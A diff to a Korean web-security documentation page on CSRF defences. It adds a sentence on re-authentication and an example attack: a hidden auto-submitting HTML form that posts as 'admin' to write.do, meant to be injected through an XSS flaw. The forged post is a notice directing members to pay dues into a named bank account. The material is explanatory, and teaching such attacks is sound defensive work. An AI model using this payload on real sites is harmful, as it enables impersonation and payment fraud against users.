@@ -161,7 +161,20 @@
 </div>
 <div class="section" id="csrf">
 <h4>3.1.4.5. CSRF (크로스사이트 요청위조)<a class="headerlink" href="#csrf" title="Permalink to this headline">¶</a></h4>
-<p>상대방이 잘못된 요청을 보내도록 하는 사회공학적 해킹 기법이다. 이를 방어하기 위해서 write.html에서 <strong>CSRF Token(난수)</strong> 을 미리 발급하고 실제 요청할때 토큰을 포함시켜서 보내도록 한다. 이를 WAS의 CSRFInterceptor를 통해 검사하고 비지니스 로직을 수행한다.</p>
+<p>상대방이 잘못된 요청을 보내도록 하는 사회공학적 해킹 기법이다. 이를 방어하기 위해서 write.html에서 <strong>CSRF Token(난수)</strong> 을 미리 발급하고 실제 요청할때 토큰을 포함시켜서 보내도록 한다. 여러가지 재인증 기법을 사용하여 막을 수 있다. 이를 WAS의 CSRFInterceptor를 통해 검사하고 비지니스 로직을 수행한다.</p>
+<p>아래는 CSRF 공격 코드의 예시이다. XSS 취약점이 있는 게시판에 삽입하여 CSRF공격을 수행할 수 있다.</p>
+<div class="code html highlight-python"><div class="highlight"><pre>&lt;body&gt;
+&lt;form style=&quot;display:none&quot; method=&quot;post&quot; action=&quot;write.do&quot; ENCTYPE=&quot;multipart/form-data&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;subject&quot; value=&quot;회비 계좌 확인 요합니다&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;writer&quot; value=&quot;관리자&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;writerId&quot; value=&quot;admin&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;content&quot; value=&quot;이번 모임의 회비 납부 안내입니다&lt;br&gt;국민은행 010 최창원&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;submit&quot; id=&quot;send&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].send.click();&lt;/script&gt;
+&lt;/body&gt;
+</pre></div>
+</div>
 </div>
 <div class="section" id="id14">
 <h4>3.1.4.6. 파일 업로드/다운로드 취약점<a class="headerlink" href="#id14" title="Permalink to this headline">¶</a></h4>
